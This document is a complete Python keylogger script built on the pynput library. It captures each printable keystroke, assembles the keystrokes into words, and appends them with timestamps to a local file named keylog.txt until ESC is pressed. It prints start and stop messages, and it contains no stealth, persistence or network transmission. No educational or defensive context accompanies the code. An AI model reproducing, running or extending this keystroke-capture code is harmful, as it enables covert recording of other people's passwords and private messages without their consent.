from pynput import keyboard
import time

# Variables to store accumulated characters for each word
current_word = []

# Function to handle key presses
def on_key_press(key):
    global current_word

    try:
        # If the user presses ESC, stop the listener
        if key == keyboard.Key.esc:
            # Write any remaining word to the file before exiting
            write_word_to_file()
            print("\nKeylogger stopped.")
            return False  # Stop the listener

        # Check if the key is a character (printable)
        if hasattr(key, 'char') and key.char is not None:
            # Add the character to the current word
            current_word.append(key.char)
        # Handle special keys like space, enter, and others
        elif key == keyboard.Key.space:
            current_word.append(' ')  # Add a space to the word
            write_word_to_file()  # Write the word to the file and reset current_word
        elif key == keyboard.Key.enter:
            current_word.append('\n')  # Add a newline
            write_word_to_file()  # Write the word to the file and reset current_word
        else:
            pass  # Ignore other special keys like shift, ctrl, etc.

    except Exception as e:
        print(f"Error: {e}")

# Function to write accumulated word to the log file
def write_word_to_file():
    global current_word

    if current_word:  # If the current word is not empty
        with open("keylog.txt", "a") as log_file:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            log_file.write(f"{timestamp} - {''.join(current_word)}\n")  # Write the word in one line
        current_word = []  # Clear the current word buffer

def main():
    print("Keylogging started... Press ESC to stop logging.")

    # Create the keyboard listener and wait for the ESC key to stop
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()  # Join ensures that the listener runs indefinitely

if __name__ == "__main__":
    main()
